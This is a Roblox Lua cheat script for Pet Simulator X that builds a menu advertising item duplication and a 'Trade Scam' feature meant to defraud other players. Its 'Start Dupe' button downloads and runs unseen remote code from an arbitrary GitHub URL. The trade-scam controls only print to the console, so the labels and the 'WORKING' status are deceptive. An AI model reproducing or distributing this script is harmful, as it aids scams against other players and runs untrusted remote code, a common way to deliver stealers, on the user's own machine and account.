if game.PlaceId == 6284583030 then
    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE 3.4", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

      local Tab = Window:MakeTab({
        Name = "Dupe",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddLabel("DUPE STATUS:WORKING")

    local Section = Tab:AddSection({
        Name = "Dupe Section"
    })
    
    Tab:AddButton({
        Name = "Click To Start Dupe",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/dsdsdsd/main/info.lua"))()
          end    
    })
    
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddLabel("Make sure that your in trade before enabled Trade Scam")

    local Section = Tab:AddSection({
	Name = "Trade Scam Section"
})

    Tab:AddToggle({
        Name = "Trade Scam",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })

    Tab:AddButton({
	Name = "Visual Trade Pet",
	Callback = function()
      		print("button pressed")
  	end    
})

local Tab = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Credits"
})

Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")



    
    
    
    
    
    
    
    
    
    end
    OrionLib:Init()
